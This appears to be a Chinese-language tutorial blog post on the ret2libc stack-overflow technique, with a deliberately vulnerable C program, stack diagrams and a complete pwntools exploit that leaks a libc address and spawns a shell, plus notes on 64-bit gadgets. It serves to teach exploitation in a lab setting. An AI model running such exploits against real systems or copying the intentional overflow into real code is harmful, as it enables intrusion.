---
title: ret2libc
date: 2026-01-22 17:05:25
tags: 
  - Pwn
---

ret2libc (Return to Libc) 是一种非常经典且常用的栈溢出攻击技术，主要用于绕过 NX (No-Execute) 保护。

它的核心原理是：既然我们无法在栈上执行 Shellcode（因为 NX 开启），那我们就去借用程序已经加载的动态链接库（libc.so）里的函数来帮我们干坏事。 最常用的目标就是 libc 里的 `system` 函数。

### ret2libc 的核心原理

要理解 ret2libc，需要搞懂两个概念：动态链接库 和 ASLR。

#### 为什么要借用 libc？

* 资源丰富：libc 是 Linux 下 C 语言的标准库，几乎所有程序都会加载它。里面包含了大量强大的函数（如 `system`, `execve`, `mprotect`）和字符串（如 `"/bin/sh"`）。
* 自带执行权限：libc 的代码段本身就是可执行的（r-x），NX 防不住它。

#### 难点：ASLR (地址空间布局随机化)

现代系统开启 ASLR 后，libc 每次加载到内存的基地址 (Base Address) 都是随机变化的。

* 我们不知道 `system` 函数现在的具体地址。
* 但是，libc 内部函数之间的相对偏移 (Offset) 是固定的（由 libc 版本决定）。

攻击公式：
1. 泄露 (Leak)：利用溢出调用 `puts` 或 `printf`，打印出某个已解析函数（如 `read` 或 `puts`）在 GOT 表中的真实地址。
2. 计算 (Calculate)：
* `libc_base` = `泄露地址` - `该函数的固定偏移`
* `system_addr` = `libc_base` + `system的固定偏移`
* `binsh_addr` = `libc_base` + `str_bin_sh的固定偏移`

1. 攻击 (Exploit)：再次触发溢出，调用 `system("/bin/sh")`。

### 一个典型的 ret2libc 例子 (32位)

为了方便理解栈结构，我们以 32位 程序为例（64位原理一样，只是传参方式不同）。

#### 漏洞源码

```c
// gcc -m32 -fno-stack-protector -o pwn_libc source.c
// 假设开启了 NX 和 ASLR
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vuln() {
    char buf[32];
    puts("Input:");
    read(0, buf, 100); // 溢出点
}

int main() {
    vuln();
    return 0;
}
```

#### 攻击步骤详解

假设我们拿到了二进制文件 `pwn_libc` 和目标系统使用的 `libc.so.6`。

栈布局目标（Payload 1 - 泄露）：
我们希望程序执行 `puts(puts_got)`，打印出 `puts` 的真实地址，然后返回到 `main` 函数（为了让我们有机会再次输入 Payload 2）。

```text
+---------------------+
| Padding (44字节)     | <-- 覆盖 buf + old_ebp
+---------------------+
| puts_plt            | <-- 返回地址：跳去执行 puts
+---------------------+
| main_addr           | <-- puts 执行完后的返回地址：跳回 main (以便第二次溢出)
+---------------------+
| puts_got            | <-- puts 的参数：打印 puts 在 GOT 表里的真实值
+---------------------+
```

栈布局目标（Payload 2 - Get Shell）：
我们已经算出了 `system` 的地址，现在要执行 `system("/bin/sh")`。

```text
+---------------------+
| Padding (44字节)     |
+---------------------+
| system_addr         | <-- 返回地址：跳去执行 system
+---------------------+
| 0xdeadbeef          | <-- system 执行完后的返回地址 (填垃圾数据，因为shell都要拿到了)
+---------------------+
| binsh_addr          | <-- system 的参数：指向 "/bin/sh"
+---------------------+
```

#### Exploit 脚本 (Pwntools)

```python
from pwn import *

context(os='linux', arch='i386', log_level='debug')
p = process('./pwn_libc')
elf = ELF('./pwn_libc')
# 需要指定正确的 libc 版本，如果是远程通常用 LibcSearcher 或提供的 libc
libc = ELF('/lib/i386-linux-gnu/libc.so.6') 

# ====================
# 第一步：泄露 Libc 地址
# ====================

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']
offset = 44 # 32(buf) + 4(ebp)，需调试确认

# 构造 Payload 1: puts(puts_got) -> return main
payload1 = flat([
    b'A' * offset,
    puts_plt,
    main_addr,    # 这里的关键：打完泄露要能回来！
    puts_got
])

p.recvuntil("Input:\n")
p.sendline(payload1)

# 接收泄露的地址
# u32() 解包 4 字节数据，ljust 补齐长度
leak_msg = p.recv(4)
puts_real_addr = u32(leak_msg.ljust(4, b'\x00'))
log.success(f"Leaked puts address: {hex(puts_real_addr)}")

# ====================
# 第二步：计算基址和目标地址
# ====================

# 核心公式：基址 = 真实地址 - 偏移量
libc_base = puts_real_addr - libc.symbols['puts']
log.success(f"Libc Base: {hex(libc_base)}")

# 计算 system 和 "/bin/sh" 的真实地址
system_addr = libc_base + libc.symbols['system']
# next() 用于获取生成器里的第一个结果
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

log.success(f"System Address: {hex(system_addr)}")
log.success(f"/bin/sh Address: {hex(binsh_addr)}")

# ====================
# 第三步：Get Shell
# ====================

# 构造 Payload 2: system("/bin/sh")
payload2 = flat([
    b'A' * offset,
    system_addr,
    0xdeadbeef,   # system 的返回地址，随便填
    binsh_addr    # system 的参数
])

# 因为程序跳回了 main，所以可以再次发送输入
p.recvuntil("Input:\n")
p.sendline(payload2)

p.interactive()
```

### 32位与64位的区别

上面的例子是 32 位的。如果是 64 位程序，ret2libc 的逻辑完全一样，但Payload 的构造有区别：

* 传参方式不同：
* 32位：参数放在栈上（就在函数地址下面）。
* 64位：参数优先放在寄存器（`RDI`, `RSI`, `RDX`...）。

* 需要 Gadget：
* 64位调用 `puts(puts_got)` 时，必须先用 `pop rdi; ret` 把 `puts_got` 放入 `RDI` 寄存器。
* 64位调用 `system("/bin/sh")` 时，必须先用 `pop rdi; ret` 把 `/bin/sh` 地址放入 `RDI` 寄存器。

64位 Payload 2 示例：
`Padding + [pop_rdi_ret] + [binsh_addr] + [system_addr]`
*(注意：64位不需要像32位那样在 system 和参数之间塞一个 4 字节的伪造返回地址，因为参数已经被 pop 走了)*

### 总结

* ret2libc = 泄露 (Leak) + 计算 (Calculate) + 调用 (Call)。
* 它是 Pwn 中最通用的技巧，专门用来对付 NX + ASLR。
* 核心思想是“就地取材”，利用系统中已有的 libc 库函数。
